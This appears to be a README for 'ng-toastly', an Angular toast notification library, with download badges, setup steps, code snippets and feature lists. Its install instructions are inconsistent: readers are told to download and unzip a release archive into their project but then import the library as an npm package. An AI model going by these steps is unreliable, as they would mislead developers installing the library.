---
layout: "default"
title: "🎉 ng-toastly - Simple and Effective Toast Notifications"
description: "🌟 Build modern, lightweight, and type-safe toast notifications for Angular to enhance user experience and streamline UI feedback."
---
# 🎉 ng-toastly - Simple and Effective Toast Notifications

## 🚀 Getting Started

Welcome to ng-toastly! This application provides modern and lightweight toast notifications for Angular 17 and beyond. It emphasizes ease of use and high accessibility standards. 

## 🛠 What You Need

Before you start, ensure you have the following:

- **Angular 17+**: This application works best with Angular version 17 or higher.
- **A web browser**: Use the latest version of Chrome, Firefox, or Edge for optimal performance.

## 🔗 Download ng-toastly

You can easily download ng-toastly using the link below:

[![Download ng-toastly](https://img.shields.io/badge/Download-ng--toastly-brightgreen)](https://github.com/JEpstein00/ng-toastly/releases)

## 📥 Download & Install

To get started with ng-toastly, follow these simple steps:

1. **Visit the Releases Page**: Click here or copy the link into your browser: [ng-toastly Releases](https://github.com/JEpstein00/ng-toastly/releases).

2. **Choose the Latest Version**: Look for the most recent release at the top of the page.

3. **Download the Package**: Click on the download link for the package suited for your project needs. The package should be labeled appropriately to reflect its functions and compatibility.

4. **Add ng-toastly to Your Project**:
   - Unzip the downloaded file if necessary.
   - Move the downloaded files into your Angular project directory.

5. **Import ng-toastly Module**: Open your Angular application in your code editor. Import the ng-toastly module into your application's main module (usually `app.module.ts`):

   ```typescript
   import { NgToastlyModule } from 'ng-toastly';

   @NgModule({
     declarations: [],
     imports: [
       NgToastlyModule.forRoot(),
     ],
     providers: [],
     bootstrap: [AppComponent],
   })
   export class AppModule { }
   ```

6. **Using Toast Notifications**: Now you can easily add toast notifications in your components. Insert the following example in your component's TypeScript file:

   ```typescript
   import { ToastService } from 'ng-toastly';

   constructor(private toastService: ToastService) {}

   showToast() {
     this.toastService.show('Hello, this is a toast notification!');
   }
   ```

7. **Run Your Application**: Start your Angular application with the command:
   ```bash
   ng serve
   ```
   Open your web browser and visit `http://localhost:4200` to see ng-toastly in action.

## 🌙 Features

ng-toastly offers a range of features designed with usability in mind:

- **Customizable Notifications**: Easily style your toast messages to fit your application’s design.
- **Multi-Positioning**: Control where your notifications appear on the screen.
- **Dark Mode Support**: Compatible with both light and dark themes.
- **Accessibility Compliance**: Built to be inclusive, ensuring everyone can use your notifications.

## 🌟 Benefits

Using ng-toastly in your Angular applications brings several advantages:

- **Simplicity**: Very easy to integrate and use, even for users without programming experience.
- **Performance**: Lightweight and efficient, ensuring fast load times.
- **Support for Signals**: Leverage reactive programming for a more responsive UI.

## 📚 Additional Resources

For more information, consider exploring the following resources:

- **Documentation**: A comprehensive guide is available in the project's documentation folder.
- **Community Support**: Join our community on platforms like Discord or GitHub discussions for help and ideas.
- **Issue Tracker**: Report any issues or bugs you encounter to help us improve ng-toastly.

## 💬 Feedback

We value your feedback. Share your thoughts or suggestions through the Issues section of our repository. Your input helps us make ng-toastly better for everyone.

## 🔗 Stay Updated

Make sure to stay in the loop for the latest updates:

[![Download ng-toastly](https://img.shields.io/badge/Download-ng--toastly-brightgreen)](https://github.com/JEpstein00/ng-toastly/releases)

By downloading ng-toastly, you empower your Angular applications with powerful notifications that enhance user experience. Enjoy your development journey!